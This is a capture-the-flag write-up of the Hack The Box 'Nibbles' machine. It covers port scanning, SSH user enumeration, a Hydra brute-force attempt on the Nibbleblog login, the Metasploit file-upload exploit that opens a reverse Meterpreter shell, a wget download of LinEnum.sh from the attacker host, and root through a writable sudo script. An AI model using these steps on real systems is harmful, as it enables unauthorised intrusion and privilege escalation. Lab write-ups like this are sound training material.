# Hackthebox Nibbles


Before we start I always reset the box, it is often that services have crashed or behaves in unintended ways after others have exploited them. And I do not want any spoilers that may have been left by others on the box.


## Recon

First, as always. we perform our initial enumeration of the box using Nmap.

```
# Nmap 7.70 scan initiated Sun Nov 11 20:32:32 2018 as: nmap -v -sV -oA nibbles_tcp 10.10.10.75
Nmap scan report for 10.10.10.75
Host is up (0.041s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

A more extensive port scan did not show any additional services.


The first service, SSH, is running a version that is vulnerable to username enumeration. I usually throw metasploit ssh_enumusers on it, with a simple wordlist.

```
msf auxiliary(scanner/ssh/ssh_enumusers) > run                                                                                                                                                               
                                                                                                                                                                                                             
[*] 10.10.10.75:22 - SSH - Using malformed packet technique                                                                                                                                                  
[*] 10.10.10.75:22 - SSH - Starting scan                                                                                                                                                                                                                                                                      
[+] 10.10.10.75:22 - SSH - User 'backup' found                                                                                                                                                               
[+] 10.10.10.75:22 - SSH - User 'bin' found                                                                                                                                                                                                                                                           
[+] 10.10.10.75:22 - SSH - User 'daemon' found                                                                                                                                                                                                                                                                                            
[+] 10.10.10.75:22 - SSH - User 'games' found                                                                                                                                                                                                                                                                    
[+] 10.10.10.75:22 - SSH - User 'gnats' found                                                
[+] 10.10.10.75:22 - SSH - User 'irc' found
[+] 10.10.10.75:22 - SSH - User 'list' found
[+] 10.10.10.75:22 - SSH - User 'lp' found
[+] 10.10.10.75:22 - SSH - User 'mail' found
[+] 10.10.10.75:22 - SSH - User 'man' found
[+] 10.10.10.75:22 - SSH - User 'messagebus' found
[+] 10.10.10.75:22 - SSH - User 'news' found
[+] 10.10.10.75:22 - SSH - User 'nobody' found
[+] 10.10.10.75:22 - SSH - User 'proxy' found
[+] 10.10.10.75:22 - SSH - User 'root' found
[+] 10.10.10.75:22 - SSH - User 'sshd' found
[+] 10.10.10.75:22 - SSH - User 'sync' found
[+] 10.10.10.75:22 - SSH - User 'sys' found
[+] 10.10.10.75:22 - SSH - User 'syslog' found
[+] 10.10.10.75:22 - SSH - User 'uucp' found
[+] 10.10.10.75:22 - SSH - User 'www-data' found
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
This may come in handy later.

### Content Discovery

Visiting the webserver we see a "It works!" message. Throwing Gobuster with various wordlists on it did not find anything interesting.

The next thing I usually do is checking the source of the page.

This time I found the following comment in the source: "<!-- /nibbleblog/ directory. Nothing interesting here! -->".

Ok, so we have a nibbleblog webapp. We would like to know the version of the blog, to map it to any potential known vulnerabilities. 

Let's run gobuster on that directory as well

```
root@kali:~/htb/nibbles# gobuster -u http://10.10.10.75/nibbleblog/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-large-files.txt 

=====================================================
Gobuster v2.0.0              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.10.75/nibbleblog/
[+] Threads      : 10
[+] Wordlist     : /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-large-files.txt
[+] Status codes : 200,204,301,302,307,403
[+] Timeout      : 10s
=====================================================
2018/11/11 21:05:50 Starting gobuster
=====================================================
/index.php (Status: 200)
/LICENSE.txt (Status: 200)
/install.php (Status: 200)
/update.php (Status: 200)
/admin.php (Status: 200)
/.htaccess (Status: 403)
/feed.php (Status: 200)
/sitemap.php (Status: 200)
/. (Status: 200)
/.html (Status: 403)
/.php (Status: 403)
/.htpasswd (Status: 403)
/.htm (Status: 403)
/.htpasswds (Status: 403)
/.htgroup (Status: 403)
/COPYRIGHT.txt (Status: 200)
/wp-forum.phps (Status: 403)
/.htaccess.bak (Status: 403)
/.htuser (Status: 403)
/.ht (Status: 403)
/.htc (Status: 403)
/.htaccess.old (Status: 403)
/.htacess (Status: 403)
=====================================================
2018/11/11 21:08:19 Finished
=====================================================
```

Update.php reveals the version of the application "Nibbleblog 4.0.3 "Coffee" ©2009 - 2014 | Developed by Diego Najar"

admin.php reveals a login page.


## Initial Compromise

Running searchsploit on nibbleblog:

```
root@kali:~/htb/nibbles# searchsploit nibbleblog
-------------------------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                                                                                                                      |  Path
                                                                                                                                                                    | (/usr/share/exploitdb/)
-------------------------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
Nibbleblog 3 - Multiple SQL Injections                                                                                                                              | exploits/php/webapps/35865.txt
Nibbleblog 4.0.3 - Arbitrary File Upload (Metasploit)                                                                                                               | exploits/php/remote/38489.rb
-------------------------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
Shellcodes: No Result
```
Nibbleblog 4.0.3 - Arbitrary File Upload matches the version on our victim! However, the exploit requires a valid login to work. 

So let's focus on the login page to see if we can find any credentials.

The following file "http://10.10.10.75/nibbleblog/content/private/users.xml" reveals a user of the application

```
<users><user username="admin"><id type="integer">0</id><session_fail_count type="integer">2</session_fail_count><session_date type="integer">1541967082</session_date></user>
```

So we have a username "admin".

Running Hydra against it shows a lot of False Positives.

```
root@kali:~/htb/nibbles# hydra -l admin -P /usr/share/wordlists/SecLists/Passwords/Common-Credentials/10k-most-common.txt 10.10.10.75 http-post-form "/nibbleblog/admin.php:username=^USER^&password=^PASSWORD^:F=Incorrect"
Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2018-11-11 21:23:32
[DATA] max 16 tasks per 1 server, overall 16 tasks, 10000 login tries (l:1/p:10000), ~625 tries per task
[DATA] attacking http-post-form://10.10.10.75:80//nibbleblog/admin.php:username=^USER^&password=^PASSWORD^:F=Incorrect
[80][http-post-form] host: 10.10.10.75   login: admin   password: qwerty
[80][http-post-form] host: 10.10.10.75   login: admin   password: pussy
[80][http-post-form] host: 10.10.10.75   login: admin   password: 12345678
[80][http-post-form] host: 10.10.10.75   login: admin   password: baseball
[80][http-post-form] host: 10.10.10.75   login: admin   password: 123456
[80][http-post-form] host: 10.10.10.75   login: admin   password: 1234
[80][http-post-form] host: 10.10.10.75   login: admin   password: 12345
[80][http-post-form] host: 10.10.10.75   login: admin   password: dragon
[80][http-post-form] host: 10.10.10.75   login: admin   password: password
[80][http-post-form] host: 10.10.10.75   login: admin   password: letmein
[80][http-post-form] host: 10.10.10.75   login: admin   password: 696969
[80][http-post-form] host: 10.10.10.75   login: admin   password: michael
[80][http-post-form] host: 10.10.10.75   login: admin   password: football
[80][http-post-form] host: 10.10.10.75   login: admin   password: monkey
[80][http-post-form] host: 10.10.10.75   login: admin   password: abc123
[80][http-post-form] host: 10.10.10.75   login: admin   password: mustang
1 of 1 target successfully completed, 16 valid passwords found
Hydra (http://www.thc.org/thc-hydra) finished at 2018-11-11 21:23:34
```

This is weird. Going back to the page I randomly see "Nibbleblog security error - Blacklist protection". Aha, there is a brute-force protection in place and that must have messed with Hydra in some way. 

So how should we approach this. I could enumerate the application some more and hope to find a password in a config file somewhere. 

However after throwing some passwords manually on the login I get in. Username: admin Password: nibbles.

We can now use the exploit on the application

```
msf exploit(multi/http/nibbleblog_file_upload) > exploit 

[*] Started reverse TCP handler on 10.10.14.17:4444 
[*] Sending stage (37775 bytes) to 10.10.10.75
[*] Meterpreter session 1 opened (10.10.14.17:4444 -> 10.10.10.75:51524) at 2018-11-11 21:33:29 +0100
[+] Deleted image.php

meterpreter > sysinfo
Computer    : Nibbles
OS          : Linux Nibbles 4.4.0-104-generic #127-Ubuntu SMP Mon Dec 11 12:16:42 UTC 2017 x86_64
Meterpreter : php/linux
meterpreter > 
```

## Establish Foothold

The first thing I usually do when I have an initial foothold on a system is to upgrade our shell. This is because some tasks and exploits during our privesc phase may require a full TTY to work. Trust me, I have learned this the hard way.

From our Meterpreter shell we can spawn a linux shell on the box

We can then type "bash -i" to get a proper bash prompt.

```
meterpreter > shell                                                                                                                                                                                          
Process 31237 created.        

bash -i                                                                                                                                                                                                      
bash: cannot set terminal process group (1320): Inappropriate ioctl for device                                                                                                                               
bash: no job control in this shell                                                                                                                                                                           
nibbler@Nibbles:/home$                     
```

## Privilege Escalation

A typical Linux privilege escalation method is based on one of the following:

1. Exploiting services running as root
2. Exploiting SUID executables
3. Exploiting SUDO rights/user
4. Exploiting badly configured cron jobs
5. Exploiting users with "." in their path
6. Kernel Exploits

Kernel exploits are typically our last resort, as there is a risk that we crash the system in the process. 

There are several scripts that automates this process for us.

I cd to /dev/shm, download a privesc-script from my attacking machine over http.

```
nibbler@Nibbles:/home/nibbler$ cd /dev/shm 
cd /dev/shm
nibbler@Nibbles:/dev/shm$ wget http://10.10.14.17:8000/LinEnum.sh
wget http://10.10.14.17:8000/LinEnum.sh 
--2018-11-11 15:38:52--  http://10.10.14.17:8000/LinEnum.sh
Connecting to 10.10.14.17:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 47066 (46K) [text/x-sh]
Saving to: 'LinEnum.sh'

     0K .......... .......... .......... .......... .....     100%  450K=0.1s
                                                                 
2018-11-11 15:38:52 (450 KB/s) - 'LinEnum.sh' saved [47066/47066]

nibbler@Nibbles:/dev/shm$ chmod +x LinEnum.sh
chmod +x LinEnum.sh                                                    
```

The enumeration shows the following potential privesc:

```
[+] We can sudo without supplying a password!                                                                                     
Matching Defaults entries for nibbler on Nibbles:                                                                                 
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin                
                                                                                                                                    
User nibbler may run the following commands on Nibbles:                                                                               
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh                                                                         
                                                                                                                                     
                                                                                                                                  
[+] Possible sudo pwnage!                                                                                                            
/home/nibbler/personal/stuff/monitor.sh  
```

So we can execute a file called monitor.sh as root with sudo. The file does not seem to exist in the users directory.

So lets simply create the filestructure and a malicious file that will spawn usa root shell. 

I had some issues creating the file on the host, so I ended up creating on locally on my attacking box and transfering it to the victim.

Then we just run the file with sudo.

```
nibbler@Nibbles:/home/nibbler/personal/stuff$ chmod 755 monitor.sh
chmod 755 monitor.sh
nibbler@Nibbles:/home/nibbler/personal/stuff$ sudo /home/nibbler/personal/stuff/monitor.sh
<er/personal/stuff$ sudo /home/nibbler/personal/stuff/monitor.sh
sudo: unable to resolve host Nibbles: Connection timed out
root@Nibbles:/home/nibbler/personal/stuff# id
id
uid=0(root) gid=0(root) groups=0(root)
```